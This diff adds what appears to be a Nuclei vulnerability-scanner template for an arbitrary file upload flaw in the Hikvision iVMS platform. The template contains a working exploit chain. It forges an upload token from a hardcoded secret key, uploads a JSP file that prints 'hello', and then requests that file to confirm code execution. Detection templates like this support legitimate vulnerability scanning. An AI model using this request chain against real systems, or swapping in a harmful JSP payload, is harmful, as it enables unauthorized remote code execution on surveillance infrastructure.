@@ -1,0 +1,52 @@
+id: hikvision-ivms-file-upload
+info:
+  name: HIKVISION iVMS File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Hikvision-iVMS comprehensive security management platform is vulnerable to an arbitrary file upload vulnerability. Attackers can exploit this issue by constructing a token using a secret key and uploading malicious files, potentially leading to remote code execution.
+  classification:
+    cvss-score: 9.8
+  tags: file-upload,rce
+  reference:
+    - https://www.hikvision.com/
+variables:
+  secret_key: "secretKeyIbuilding"
+  boundary: '{{rand_base(32)}}'
+  filename: '{{rand_base(10)}}.jsp'
+  content: '<% out.println("hello"); %>'
+http:
+  - raw:
+      - |
+        POST /eps/api/resourceOperations/upload?token={{md5(concat(BaseURL, "/eps/api/resourceOperations/upload", secret_key))}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}\r\nContent-Disposition: form-data; name="fileUploader"; filename="{{filename}}"\r\nContent-Type: image/jpeg\r\n\r\n{{content}}\r\n--{{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+    extractors:
+      - type: regex
+        name: resource_uuid
+        part: body
+        regex:
+          - '"resourceUuid":"([a-zA-Z0-9]{32})"'
+        group: 1
+    stop-at-first-match: true
+  - raw:
+      - |
+        GET /eps/upload/{{resource_uuid}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "hello"
+      - type: status
+        status:
+          - 200
